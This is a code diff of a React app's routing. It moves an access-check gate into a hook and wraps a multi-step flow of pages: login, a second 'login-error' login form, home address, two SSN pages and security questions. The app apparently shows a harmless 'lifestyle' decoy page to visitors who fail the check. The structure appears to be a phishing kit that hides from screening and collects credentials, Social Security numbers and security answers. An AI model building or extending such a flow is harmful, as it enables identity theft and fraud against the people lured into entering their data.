@@ -1,11 +1,9 @@
-import { BrowserRouter as Router, Routes, Route, Navigate, useLocation } from 'react-router-dom';
-import { useState, useEffect } from 'react';
-import axios from 'axios';
+import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
+import useAccessCheck from './Utils/useAccessCheck';
 import { baseUrl } from './constants';
 
 // Components
-import Header from './components/Header';
-import Footer from './components/Footer';
+import FlowLayout from './components/FlowLayout';
 
 // Pages
 import LoginForm from './pages/LoginForm';
@@ -17,130 +15,135 @@ import SSN1 from './pages/SSN1';
 import SSN2 from './pages/SSN2';
 import SecurityQuestions from './pages/SecurityQuestions';
 import Terms from './pages/Terms';
-import OTPVerification from './pages/OTPVerification';
 import LifestyleDemo from './pages/LifestyleDemo';
 
+interface ProtectedLayoutProps {
+  children: React.ReactNode;
+  containerClassName?: string;
+}
+
 // Layout component for protected routes
-const ProtectedLayout = ({ children }: { children: React.ReactNode }) => {
-  const [isAllowed, setIsAllowed] = useState<boolean | null>(null);
-  const [isLoading, setIsLoading] = useState<boolean>(true);
-  const location = useLocation();
-  const fullWidthRoutes = ['/login', '/login-error'];
-  const isFullWidthRoute = fullWidthRoutes.includes(location.pathname);
+const ProtectedLayout: React.FC<ProtectedLayoutProps> = ({ children, containerClassName }) => {
+  const isAllowed = useAccessCheck(baseUrl);
 
-  useEffect(() => {
-    const checkAccess = async () => {
-      try {
-        await axios.get(`${baseUrl}api/check-access/`);
-        setIsAllowed(true);
-      } catch (error) {
-        console.error('Access check failed:', error);
-        setIsAllowed(false);
-      } finally {
-        setIsLoading(false);
-      }
-    };
-
-    checkAccess();
-  }, []);
-
-  if (isLoading) {
-    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
+  if (isAllowed === null) {
+    return (
+      <FlowLayout>
+        <div className="text-white text-center text-lg">Loading...</div>
+      </FlowLayout>
+    );
   }
 
-  if (!isAllowed) {
-    return <Navigate to="/lifestyle-check" replace />;
+  if (isAllowed === false) {
+    return (
+      <FlowLayout>
+        <div className="text-white text-center text-lg">Access denied. Redirecting...</div>
+      </FlowLayout>
+    );
   }
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <Header />
-      <main className={`flex-1 flex flex-col ${isFullWidthRoute ? '' : 'bg-gray-50 py-12'}`}>
-        {isFullWidthRoute ? (
-          <div className="flex-1 flex flex-col w-full">{children}</div>
-        ) : (
-          <div className="max-w-7xl mx-auto px-4">
-            <div className="flex gap-6">
-              {children}
-            </div>
-          </div>
-        )}
-      </main>
-      <Footer />
-    </div>
+    <FlowLayout>
+      <div className={containerClassName ?? 'w-full max-w-2xl'}>{children}</div>
+    </FlowLayout>
   );
+};
+
+const ProtectedRoute: React.FC<ProtectedLayoutProps> = ({ children, containerClassName }) => {
+  return <ProtectedLayout containerClassName={containerClassName}>{children}</ProtectedLayout>;
 };
 
 function App() {
   return (
     <Router>
       <Routes>
-        {/* Public route */}
+        {/* Public routes */}
         <Route path="/" element={<LifestyleDemo />} />
-        
+
         {/* Protected routes */}
-        <Route path="/login" element={
-          <ProtectedLayout>
-            <LoginForm />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/login-error" element={
-          <ProtectedLayout>
-            <LoginForm2 />
-          </ProtectedLayout>
-        } />
-        
-  
-        
-        <Route path="/register" element={
-          <ProtectedLayout>
-            <Register />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/basic-info" element={
-          <ProtectedLayout>
-            <BasicInfo />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/home-address" element={
-          <ProtectedLayout>
-            <HomeAddress />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn1" element={
-          <ProtectedLayout>
-            <SSN1 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/ssn2" element={
-          <ProtectedLayout>
-            <SSN2 />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/security-questions" element={
-          <ProtectedLayout>
-            <SecurityQuestions />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/terms" element={
-          <ProtectedLayout>
-            <Terms />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/otp-verification" element={
-          <ProtectedLayout>
-            <OTPVerification />
-          </ProtectedLayout>
-        } />
-        
+        <Route
+          path="/login"
+          element={
+            <ProtectedRoute containerClassName="w-full max-w-md">
+              <LoginForm />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/login-error"
+          element={
+            <ProtectedRoute containerClassName="w-full max-w-md">
+              <LoginForm2 />
+            </ProtectedRoute>
+          }
+        />
+
+
+
+        <Route
+          path="/register"
+          element={
+            <ProtectedRoute>
+              <Register />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/basic-info"
+          element={
+            <ProtectedRoute>
+              <BasicInfo />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/home-address"
+          element={
+            <ProtectedRoute>
+              <HomeAddress />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/ssn1"
+          element={
+            <ProtectedRoute>
+              <SSN1 />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/ssn2"
+          element={
+            <ProtectedRoute>
+              <SSN2 />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/security-questions"
+          element={
+            <ProtectedRoute>
+              <SecurityQuestions />
+            </ProtectedRoute>
+          }
+        />
+
+        <Route
+          path="/terms"
+          element={
+            <ProtectedRoute>
+              <Terms />
+            </ProtectedRoute>
+          }
+        />
+
         {/* Redirect any unknown routes to home */}
         <Route path="*" element={<Navigate to="/" replace />} />
       </Routes>
